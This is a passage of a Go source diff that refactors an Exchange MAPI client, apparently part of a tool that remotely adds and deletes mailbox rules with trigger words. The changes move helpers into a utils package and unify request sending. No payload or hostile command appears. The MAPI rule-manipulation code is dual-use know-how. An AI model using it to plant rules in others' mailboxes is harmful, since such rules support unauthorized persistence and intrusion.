 	propertyValues[4] = TaggedPropertyValue{PidTagRuleActions, pdat}
 	//PidTagRuleProvider
-	propertyValues[5] = TaggedPropertyValue{PidTagRuleProvider, UniString("RuleOrganizer")}
+	propertyValues[5] = TaggedPropertyValue{PidTagRuleProvider, utils.UniString("RuleOrganizer")}
 	//PidTagRuleLevel
 	propertyValues[6] = TaggedPropertyValue{PidTagRuleLevel, []byte{0x00, 0x00, 0x00, 0x00}}
 	//PidTagRuleProviderData
@@ -1367,23 +1357,21 @@ func ExecuteMailRuleAdd(rulename, triggerword, triggerlocation string, delete bo
 
 	addRule.RuleData.PropertyValues = propertyValues
 	addRule.RuleData.PropertyValueCount = uint16(len(propertyValues))
-	ruleBytes := BodyToBytes(addRule)
+	ruleBytes := utils.BodyToBytes(addRule)
 
 	execRequest.RopBuffer.ROP.RopsList = ruleBytes
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x01, 0x00, 0x00, AuthSession.LogonID} //append(AuthSession.RulesHandle, []byte{0xFF, 0xFF, 0xFF, 0xFF}...)
 
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
-		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
-		return &execResponse, nil
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
-	return nil, fmt.Errorf("[x] An Unspecified error occurred")
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+	return &execResponse, nil
+
+	//return nil, fmt.Errorf("[x] An Unspecified error occurred")
 }
 
 //ExecuteMailRuleDelete function to delete mailrules
@@ -1398,37 +1386,32 @@ func ExecuteMailRuleDelete(ruleid []byte) error {
 	delRule.RuleData.PropertyValues = make([]TaggedPropertyValue, 1)
 	delRule.RuleData.PropertyValues[0] = TaggedPropertyValue{PidTagRuleID, ruleid}
 
-	ruleBytes := BodyToBytes(delRule)
+	ruleBytes := utils.BodyToBytes(delRule)
 	execRequest.RopBuffer.ROP.RopsList = ruleBytes
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x01, 0x00, 0x00, AuthSession.LogonID} //append(AuthSession.RulesHandle, []byte{0xFF, 0xFF, 0xFF, 0xFF}...)
 
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
-		if err != nil {
-			return fmt.Errorf("[x] A HTTP server side error occurred while deleting the rule.\n %s", err)
-		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
-		if execResponse.StatusCode == 0 {
-			return nil
-		}
-		return fmt.Errorf("[x] A server side error occurred while deleting the rule. Check ruleid")
+	if err != nil {
+		return fmt.Errorf("[x] A HTTP server side error occurred while deleting the rule.\n %s", err)
+	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
 
+	if execResponse.StatusCode == 0 {
+		return nil
 	}
 	return fmt.Errorf("[x] A server side error occurred while deleting the rule. Check ruleid")
+
 }
 
 //Ping send a PING message to the server
 func Ping() {
 	isAuthenticated() //check if we actually have a session
-	if AuthSession.Transport == HTTP {
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "PING", []byte{})
-		fmt.Println(resp)
-		fmt.Println(string(rbody))
-		fmt.Println(AuthSession.CookieJar)
-	}
+	responseBody, _ := sendMapiRequest("PING", []byte{})
+	fmt.Println(responseBody)
+	fmt.Println(AuthSession.CookieJar)
+
 }
 
 //DecodeGetTableResponse function Unmarshals the various parts of a getproperties response (this includes the initial openfolder request)
@@ -1506,16 +1489,16 @@ func DecodeBufferToRows(buff []byte, cols []PropertyTag) []PropertyRow {
 		trow := PropertyRow{}
 		//trow.Flag, pos = readByte(pos, buff)
 		if property.PropertyType == PtypInteger32 {
-			trow.ValueArray, pos = readBytes(pos, 2, buff)
+			trow.ValueArray, pos = utils.ReadBytes(pos, 2, buff)
 			rows = append(rows, trow)
 		} else if property.PropertyType == PtypString {
 			pos += 8 //hack for now
-			trow.ValueArray, pos = readUnicodeString(pos, buff)
+			trow.ValueArray, pos = utils.ReadUnicodeString(pos, buff)
 			rows = append(rows, trow)
 		} else if property.PropertyType == PtypBinary {
-			cnt, p := readUint16(pos, buff)
+			cnt, p := utils.ReadUint16(pos, buff)
 			pos = p
-			trow.ValueArray, pos = readBytes(pos, int(cnt), buff)
+			trow.ValueArray, pos = utils.ReadBytes(pos, int(cnt), buff)
 			rows = append(rows, trow)
 		}
 	}
